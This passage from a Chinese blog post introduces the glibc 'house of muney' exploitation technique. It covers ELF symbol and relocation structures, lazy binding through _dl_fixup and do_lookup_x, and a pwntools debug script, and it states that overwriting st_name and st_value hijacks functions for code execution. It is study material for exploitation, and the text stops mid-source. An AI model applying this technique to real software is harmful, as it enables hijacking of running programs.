<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>house_of_muney | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>house_of_muney</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-05-16T20:23:35.000Z" id="date"> 2024-05-16</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-05-17T13:17:16.539Z" id="updated"> 2024-05-17</time></div></span></div></div><hr><div id="post-content"><p><strong>[前置]</strong><br><em>[glibc源码调试]</em><br>该手段需配合glibc的源码分析，先存一个glibc源码的调试配置</p>
<p>具体glibc的编译可以参考前面的文，注意一下glibc-all-in-one下载的东西貌似不能直接用，可以在这里下载：<a target="_blank" rel="noopener" href="https://ftp.gnu.org/gnu/glibc/">https://ftp.gnu.org/gnu/glibc/</a></p>
<p>可以按以下脚本启动，需要注意dir指定的目录</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,endian=<span class="hljs-string">&quot;little&quot;</span>)<br><br>p = process([<span class="hljs-string">&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;</span>,<span class="hljs-string">&quot;./a.out&quot;</span>],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>&#125;)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p, s)<br>    pause()<br><br>cmd = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elf</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>debug(cmd)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p>效果如下<br class='item-img' data-src='/2024/05/17/house-of-muney/glibc.png'><img src="/2024/05/17/house-of-muney/glibc.png"><br></p>
<p><em>[ELF]</em><br>以简单的程序看看ELF文件的解析过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc sys1.c -fno-pie -g -o sys1</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">char</span> *buff;<br>read(<span class="hljs-number">0</span>,buff,<span class="hljs-number">0x15</span>);<span class="hljs-comment">//为了让程序长一点好下断点</span><br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>组成 elf 文件的基本单位是 section，可以翻译为节。elf 头会定义节头表，节头表中定义了节的数量、每个节的类型、起始的虚拟地址。与动态链接相关的节为.dynamic 节，这里面存储这与动态链接相关的描述信息。<br class='item-img' data-src='/2024/05/17/house-of-muney/e1f.png'><img src="/2024/05/17/house-of-muney/e1f.png"><br><br>这里的.dynamic节实际上是一个数组，其中的每一个元素都表示其对应的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Sxword	d_tag;			<span class="hljs-comment">/* Dynamic entry type */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      Elf64_Xword d_val;		<span class="hljs-comment">/* Integer value */</span><br>      Elf64_Addr d_ptr;			<span class="hljs-comment">/* Address value */</span><br>    &#125; d_un;<br>&#125; Elf64_Dyn;<br></code></pre></td></tr></table></figure>
<p>tag表示的是该元素（节）的类型，如readelf的结果中的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0000000000000005 (STRTAB)             0x400438<br>0x0000000000000006 (SYMTAB)             0x4003c0<br></code></pre></td></tr></table></figure>
<p>则这俩元素的类型分别为STRTAB和SYMTAB。而符号解析与STRTAB和SYMTAB相关。</p>
<p>STRTAB是字符串表，存储的是整个程序所需要用到的所有字符。SYMTAB则是符号表，其数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Word	st_name;		<span class="hljs-comment">/* Symbol name (string tbl index) */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>	st_info;		<span class="hljs-comment">/* Symbol type and binding */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;		<span class="hljs-comment">/* Symbol visibility */</span><br>  Elf64_Section	st_shndx;		<span class="hljs-comment">/* Section index */</span><br>  Elf64_Addr	st_value;		<span class="hljs-comment">/* Symbol value */</span><br>  Elf64_Xword	st_size;		<span class="hljs-comment">/* Symbol size */</span><br>&#125; Elf64_Sym;<br></code></pre></td></tr></table></figure>
<p>st_name表示这个符号所描述的字符串在字符串表中的下标。st_value表示符号的值。而当符号是一个函数或者变量的时候，这个值就代表符号的虚拟地址</p>
<p>那么，我们如果能篡改st_name和st_value，就能将某一函数劫持为另一函数，造成代码执行</p>
<p>STRTAB和SYMTAB实现了符号的寻找，但是还需要用重定位表来描述那些符号需要重定位<br class='item-img' data-src='/2024/05/17/house-of-muney/e2f.png'><img src="/2024/05/17/house-of-muney/e2f.png"><br>重定位表的数据结构为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Addr	r_offset;		<span class="hljs-comment">/* Address */</span><br>  Elf64_Xword	r_info;			<span class="hljs-comment">/* Relocation type and symbol index */</span><br>&#125; Elf64_Rel;<br></code></pre></td></tr></table></figure>
<p>一般在查找动态符号的时候，r_offset代表对应符号在 got 表中的地址,即我们平时使用的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">elf.got[<span class="hljs-string">&#x27;function&#x27;</span>]<br></code></pre></td></tr></table></figure>
<p>拿到的地址<br>r_info低 32 位表示重定位入口的类型，高 32 位表示这个重定位符号在符号表中的下标。</p>
<p>plt表和got表的事儿在玩格式化字符串和ret2libc的时候就搞过了，基本上就是plt表跳转到got表，若是第一次调用该函数，则解析该函数的地址，填入到got表内，之后每次调用就直接使用真实地址进行跳转</p>
<p>看一下第一次调用时执行的指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push n<br>push ModuleID<br>jmp _dl_runtime_resolve<br></code></pre></td></tr></table></figure>
<p>这里的 n 对应的是该符号在 rel.plt 重定位表中的下标<br>ModuleID一般是程序的linkmap结构体的地址<br>接下来跳到_dl_runtime_resolve，看一手<br class='item-img' data-src='/2024/05/17/house-of-muney/resolve.png'><img src="/2024/05/17/house-of-muney/resolve.png"><br>_dl_runtime_resolve_xsavec.先保护了一波现场，再call了dl_fixup，看看dl_fixup(dl-runtime.c,line 52)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This function is called through a special trampoline from the PLT the first time each PLT entry is called.  We must perform the relocation specified in the PLT of the given shared object, and return the resolved function address to the trampoline, which will restart the original call to that address.Future calls will bounce directly from the PLT to the</span><br><span class="hljs-comment">   function.  */</span><br><br>DL_FIXUP_VALUE_TYPE<br>attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE<br>_dl_fixup (<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br>	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>	   <span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *refsym = sym;<br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>	  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum =<br>	    (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>	  version = &amp;l-&gt;l_versions[ndx];<br>	  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>	    version = <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment">	 not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment">	 we are not using any threads (yet).  */</span><br>      <span class="hljs-type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	&#123;<br>	  THREAD_GSCOPE_SET_FLAG ();<br>	  flags |= DL_LOOKUP_GSCOPE_LOCK;<br>	&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span><br>      RTLD_ENABLE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br><br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	THREAD_GSCOPE_RESET_FLAG ();<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment">	 of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment">	 offset.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (result,<br>				   SYMBOL_ADDRESS (result, sym, <span class="hljs-literal">false</span>));<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment">	 address) is also known.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>其中调用了_dl_lookup_symbol_x来寻找符号，实际调用了do_lookup_x，这个函数在dl-lookup.c,line358</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Inner part of the lookup functions.  We return a value &gt; 0 if we</span><br><span class="hljs-comment">   found the symbol, the value 0 if nothing is found and &lt; 0 if</span><br><span class="hljs-comment">   something bad happened.  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span><br>__attribute_noinline__<br><span class="hljs-title function_">do_lookup_x</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *undef_name, <span class="hljs-type">uint_fast32_t</span> new_hash,</span><br><span class="hljs-params">	     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *old_hash, <span class="hljs-type">const</span> ElfW(Sym) *ref,</span><br><span class="hljs-params">	     <span class="hljs-keyword">struct</span> sym_val *result, <span class="hljs-keyword">struct</span> r_scope_elem *scope, <span class="hljs-type">size_t</span> i,</span><br><span class="hljs-params">	     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> r_found_version *<span class="hljs-type">const</span> version, <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">	     <span class="hljs-keyword">struct</span> link_map *skip, <span class="hljs-type">int</span> type_class, <span class="hljs-keyword">struct</span> link_map *undef_map)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> n = scope-&gt;r_nlist;<br>  <span class="hljs-comment">/* Make sure we read the value before proceeding.  Otherwise we</span><br><span class="hljs-comment">     might use r_list pointing to the initial scope and r_nlist being</span><br><span class="hljs-comment">     the value after a resize.  That is the only path in dl-open.c not</span><br><span class="hljs-comment">     protected by GSCOPE.  A read barrier here might be to expensive.  */</span><br>  __asm <span class="hljs-title function_">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;+r&quot;</span> (n), <span class="hljs-string">&quot;+m&quot;</span> (scope-&gt;r_list))</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> **<span class="hljs-title">list</span> =</span> scope-&gt;r_list;<br><br>  <span class="hljs-keyword">do</span><br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">map</span> =</span> <span class="hljs-built_in">list</span>[i]-&gt;l_real;<br><br>      <span class="hljs-comment">/* Here come the extra test needed for `_dl_lookup_symbol_skip&#x27;.  */</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span> == skip)<br>	<span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* Don&#x27;t search the executable when resolving a copy reloc.  */</span><br>      <span class="hljs-keyword">if</span> ((type_class &amp; ELF_RTYPE_CLASS_COPY) &amp;&amp; <span class="hljs-built_in">map</span>-&gt;l_type == lt_executable)<br>	<span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* Do not look into objects which are going to be removed.  */</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;l_removed)<br>	<span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* Print some debugging info if wanted.  */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_SYMBOLS))<br>	_dl_debug_printf (<span class="hljs-string">&quot;symbol=%s;  lookup in file=%s [%lu]\n&quot;</span>,<br>			  undef_name, DSO_FILENAME (<span class="hljs-built_in">map</span>-&gt;l_name),<br>			  <span class="hljs-built_in">map</span>-&gt;l_ns);<br><br>      <span class="hljs-comment">/* If the hash table is empty there is nothing to do here.  */</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;l_nbuckets == <span class="hljs-number">0</span>)<br>	<span class="hljs-keyword">continue</span>;<br><br>      Elf_Symndx symidx;<br>      <span class="hljs-type">int</span> num_versions = <span class="hljs-number">0</span>;<br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *versioned_sym = <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-comment">/* The tables for this map.  */</span><br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *symtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (<span class="hljs-built_in">map</span>, l_info[DT_SYMTAB]);<br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (<span class="hljs-built_in">map</span>, l_info[DT_STRTAB]);<br><br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym;<br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Addr)</span> *bitmask = <span 